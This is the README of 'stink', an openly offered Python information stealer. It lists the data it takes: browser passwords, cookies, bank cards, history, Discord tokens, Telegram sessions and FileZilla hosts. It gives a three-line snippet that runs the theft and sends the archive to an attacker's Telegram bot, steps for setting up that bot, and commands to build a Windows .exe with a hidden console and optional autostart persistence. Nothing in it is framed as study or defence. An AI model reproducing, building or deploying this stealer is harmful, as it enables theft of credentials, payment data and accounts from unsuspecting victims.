# stink

Stealer in just 3 lines with sending to telegram.

## Description
The `stink` already has an impressive functionality that will only expand.

## Navigation
* [Current features](#Сurrent-features)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
  * [Additional parameters](#Additional-parameters)
* [Telegram bot setup](#Telegram-bot-setup)
  * [Getting token](#Getting-token)
  * [Getting id](#Getting-id)
* [Creating exe](#Creating-exe)
  * [Creating executable file](#Creating-executable-file)
  * [With BAT](#With-BAT)
  * [With CMD](#With-CMD)

### Current features
1. Support for the following browsers:
   - Chrome
   - Opera
   - Opera GX
   - Edge
   - Brave
   - Vivaldi
2. Collecting the following data:
   - Screenshot
   - Cookies
   - Passwords
   - Bank cards
   - History
   - Bookmarks
   - IP-address
   - System configuration
   - Active processes
   - Discord tokens
   - Telegram sessions
   - FileZilla hosts
3. Support for browser multiprofiles.
4. Sending an archive of collected data to Telegram.
5. Execution in a separate thread.
6. Execution using multiprocessor.
7. Possibility to add to autostart.

## Example usage
### Standard
```python
from stink import Stealer

if __name__ == '__main__':
    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
### Additional parameters

- `errors` - error output.

- `autostart` - adding to autostart.

- `passwords` - collecting passwords.

- `cookies` - collecting cookies.

- `cards` - collecting of bank cards.

- `history` - collecting search history.

- `bookmarks` - collecting bookmarks.

- `processes` - collecting of active processes.

- `system` - collecting system configuration.

- `screen` - screenshot.

- `discord` - collecting Discord tokens.

- `telegram` - collecting Telegram sessions.

- `filezilla` - collecting FileZilla hosts.

All parameters take the value of `bool`. 

- `True` - the function is enabled.

- `False` - the function is disabled.

All functions are enabled by default, except for error output and adding to autostart.

## Telegram bot setup
### Getting token
1. Open a chat with [BotFather](https://t.me/botfather).
2. Write the command ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Insert the resulting token into the ```YOUR_TOKEN``` field in the script.

### Getting id
1. Open a chat with [Get My ID](https://t.me/getmyid_bot).
2. Write the command ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Insert the resulting ID into the ```YOUR_ID``` field in the script.

After that, you need to write any message to the bot, so he will be able to send us the archive.

## Creating exe
Python is an interpreted programming language, so we first translate it into C and then compile it into an .exe file.
We will need Nuitka to do this.

### Creating executable file

1. [Download](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) archive.
2. Unpack the archive and go to the directory stink-master.
3. Create test.py (or any other name) file in the same directory with the following code:
```python
from stink import Stealer

if __name__ == '__main__':
    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

#### With BAT
1. Run compiler.bat.


#### With CMD
1. Open `cmd`.
2. Type in the command:
```
pip install virtualenv
```
3. Go to the folder with the `test.py` file:
```
cd path\to\file
```
4. Create a virtual environment and activate it:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Install the requirements:
```
pip install -r requirements.txt
```
6. Install the Nuitka:
```
pip install Nuitka==0.6.16.4
```
7. To reduce the file size, additionally install Zstandard (optional):
```
pip install zstandard==0.17.0
```
8. Write the command:
```
nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
```

After executing the command we get the test.exe file with the hidden console.
